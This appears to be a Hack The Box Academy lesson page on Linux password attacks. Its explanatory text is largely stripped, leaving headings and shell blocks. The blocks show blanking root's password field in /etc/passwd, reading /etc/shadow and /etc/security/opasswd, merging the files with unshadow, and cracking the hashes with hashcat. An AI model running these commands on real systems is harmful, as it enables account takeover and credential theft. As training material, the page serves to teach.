<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/147/section/1319
// Platform Version: V1
// Module ID: 147
// Module Name: Password Attacks
// Module Difficulty: Medium
// Section ID: 1319
// Section Title: Passwd, Shadow & Opasswd
// Page Title: Password Attacks
// Page Number: 12
-->

# Passwd, Shadow & Opasswd

**Module Name:** Password Attacks **Page Number:** 12

#### PASSWORD ATTACKS

# Passwd, Shadow & Opasswd

## Passwd File

#### Passwd Format

#### Editing /etc/passwd - Before

```shell-session
root:x:0:0:root:/root:/bin/bash
```

#### Editing /etc/passwd - After

```shell-session
root::0:0:root:/root:/bin/bash
```

#### Root without Password

```shell-session
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash


[cry0l1t3@parrot]─[~]$ su

[root@parrot]─[/home/cry0l1t3]#
```

## Shadow File

#### Shadow Format

#### Shadow File

```shell-session
[cry0l1t3@parrot]─[~]$ sudo cat /etc/shadow

root:*:18747:0:99999:7:::
sys:!:18747:0:99999:7:::
...SNIP...
cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
```

#### Algorithm Types

## Opasswd

#### Reading /etc/security/opasswd

```shell-session
[!bash!]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

## Cracking Linux Credentials

#### Unshadow

```shell-session
[!bash!]$ sudo cp /etc/passwd /tmp/passwd.bak 
[!bash!]$ sudo cp /etc/shadow /tmp/shadow.bak 
[!bash!]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Hashcat - Cracking Unshadowed Hashes

```shell-session
[!bash!]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### Hashcat - Cracking MD5 Hashes

```shell-session
[!bash!]$ cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
```

```shell-session
[!bash!]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

# 

# 

#### Questions

####